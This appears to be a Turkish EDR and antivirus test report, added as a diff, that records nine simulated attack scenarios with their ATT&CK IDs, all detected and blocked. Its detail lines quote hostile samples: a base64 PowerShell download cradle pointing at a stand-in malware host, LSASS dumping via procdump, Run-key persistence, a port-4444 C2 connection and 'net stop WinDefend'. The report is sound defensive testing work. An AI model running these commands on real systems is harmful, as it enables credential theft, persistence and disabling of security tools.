@@ -1,0 +1,79 @@
+======================================================================
+GÜN 148: EDR VE AV NEGATİF KONTROL VE TEHDİT YAKALAMA RAPORU
+Tarih/Saat: 2026-11-03T23:47:12.433744
+Bu rapor; süreç soy ağacı anomalileri, bellek dökümü (LSASS),
+çapraz enjeksiyon, C2 tespiti ve statik AV yakalama sonuçlarını kanıtlar.
+======================================================================
+
+Senaryo 1/9: [NS-EDR-01] Word Belgesinden PowerShell Başlatma (Office Makro Oltalama Saldırısı)
+  Kategori       : Süreç Soy Ağacı Anomalisi
+  MITRE ATT&CK   : T1059.001
+  Beklenen Kural : EDR-RULE-001 (CRITICAL)
+  Sonuç          : [BAŞARILI - İZOLE EDİLDİ] Office Uygulaması Komut Satırı/PowerShell Başlattı
+  Müdahale       : KILL_PROCESS (PID: 5012)
+  Ayrıntı        : Office uygulaması 'WINWORD.EXE' (PID: 4100) yetkisiz betik yorumlayıcısı 'powershell.exe' (PID: 5012) başlattı.
+----------------------------------------------------------------------
+Senaryo 2/9: [NS-EDR-02] Gizlenmiş / Base64 Kodlu PowerShell İndirme Kodu (Download Cradle)
+  Kategori       : Kod Gizleme ve Savunma Atlama
+  MITRE ATT&CK   : T1059.001 / T1027
+  Beklenen Kural : EDR-RULE-002 (CRITICAL)
+  Sonuç          : [BAŞARILI - İZOLE EDİLDİ] Şifrelenmiş veya Gizlenmiş PowerShell Download Cradle
+  Müdahale       : KILL_PROCESS (PID: 5080)
+  Ayrıntı        : PowerShell sürecinde şüpheli indirme ve kod gizleme (Obfuscation) kalıbı yakalandı: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOiAvIC8gbQBhAGwAdwBhAHIAZQAuAGwAbwBjAGEAbAAnACkA
+----------------------------------------------------------------------
+Senaryo 3/9: [NS-EDR-03] LSASS Belleğinden Parola Dökümü Alma (Credential Dumping)
+  Kategori       : Kimlik Bilgisi Erişimi
+  MITRE ATT&CK   : T1003.001
+  Beklenen Kural : EDR-RULE-003 (CRITICAL)
+  Sonuç          : [BAŞARILI - İZOLE EDİLDİ] LSASS Bellek Erişim ve Kimlik Bilgisi Çalma Girişimi
+  Müdahale       : ISOLATE_HOST (PID: 6200)
+  Ayrıntı        : Süreç 'procdump.exe' (PID: 6200) kritik 'lsass.exe' sürecinin belleğine erişmeye çalıştı (Erişim Maskesi: 0x1010).
+----------------------------------------------------------------------
+Senaryo 4/9: [NS-EDR-04] Çapraz Süreç Bellek Enjeksiyonu (Process Injection / CreateRemoteThread)
+  Kategori       : Savunma Atlama ve Süreç İhlali
+  MITRE ATT&CK   : T1055
+  Beklenen Kural : EDR-RULE-004 (CRITICAL)
+  Sonuç          : [BAŞARILI - İZOLE EDİLDİ] Çapraz Süreç Bellek Enjeksiyonu (Process Injection)
+  Müdahale       : KILL_PROCESS (PID: 6300)
+  Ayrıntı        : Çapraz süreç bellek enjeksiyonu tespit edildi. Çağrı izi: ntdll.dll!NtCreateThreadEx|KERNELBASE.dll!CreateRemoteThread
+----------------------------------------------------------------------
+Senaryo 5/9: [NS-EDR-05] Kayıt Defteri Otomatik Çalıştırma (Run Key) Kalıcılığı Sağlama
+  Kategori       : Kalıcılık (Persistence)
+  MITRE ATT&CK   : T1547.001
+  Beklenen Kural : EDR-RULE-005 (HIGH)
+  Sonuç          : [BAŞARILI - İZOLE EDİLDİ] Kayıt Defteri Otomatik Başlatma (Run Key) Kalıcılığı
+  Müdahale       : ALERT_ONLY (PID: 6400)
+  Ayrıntı        : Kayıt defterine kalıcılık anahtarı yazıldı: HKLM\Software\Microsoft\Windows\CurrentVersion\Run = C:\ProgramData\updater.exe
+----------------------------------------------------------------------
+Senaryo 6/9: [NS-EDR-06] Şüpheli Dış Porta (4444) Komuta Kontrol (C2) Ters Bağlantısı
+  Kategori       : Komuta ve Kontrol (C2)
+  MITRE ATT&CK   : T1071
+  Beklenen Kural : EDR-RULE-006 (CRITICAL)
+  Sonuç          : [BAŞARILI - İZOLE EDİLDİ] Şüpheli Dış Ağ Portuna Komuta Kontrol (C2) Bağlantısı
+  Müdahale       : ISOLATE_HOST (PID: 5012)
+  Ayrıntı        : 'powershell.exe' süreci şüpheli C2 portuna (198.51.100.99:4444) giden TCP bağlantısı kurdu.
+----------------------------------------------------------------------
+Senaryo 7/9: [NS-EDR-07] Windows Defender ve EDR Servisini Durdurma Girişimi
+  Kategori       : Savunmayı Devre Dışı Bırakma (Tampering)
+  MITRE ATT&CK   : T1562.001
+  Beklenen Kural : EDR-RULE-007 (CRITICAL)
+  Sonuç          : [BAŞARILI - İZOLE EDİLDİ] Uç Nokta Güvenlik Servisini Durdurma / Bozma Girişimi
+  Müdahale       : ISOLATE_HOST (PID: 6900)
+  Ayrıntı        : Güvenlik savunma mekanizmasını kapatma komutu yürütüldü: net stop WinDefend
+----------------------------------------------------------------------
+Senaryo 8/9: [NS-EDR-08] Statik Antivirüs (AV) Taraması: EICAR Standart Test Dosyası
+  Kategori       : Statik Dosya / AV İmzası
+  MITRE ATT&CK   : T1204
+  Beklenen Kural : AV-SIG-001 (MEDIUM)
+  Sonuç          : [BAŞARILI - STATİK AV YAKALADI] Statik AV İmzası Tespit Edildi: EICAR.Standard.Antivirus.TestFile
+  Karantina      : C:\Users\kullanici\Downloads\eicar_test.com
+----------------------------------------------------------------------
+Senaryo 9/9: [NS-EDR-09] Statik Antivirüs (AV) Taraması: Mimikatz Parola Çalma Aracı Deseni
+  Kategori       : Statik Dosya / YARA İmzası
+  MITRE ATT&CK   : T1204 / T1003
+  Beklenen Kural : AV-SIG-002 (CRITICAL)
+  Sonuç          : [BAŞARILI - STATİK AV YAKALADI] Statik AV İmzası Tespit Edildi: HackTool.Win64.Mimikatz.B
+  Karantina      : C:\Temp\mimi_payload.exe
+----------------------------------------------------------------------
+
+TOPLAM NEGATİF KONTROL: 9 / 9 BAŞARILI (%100)
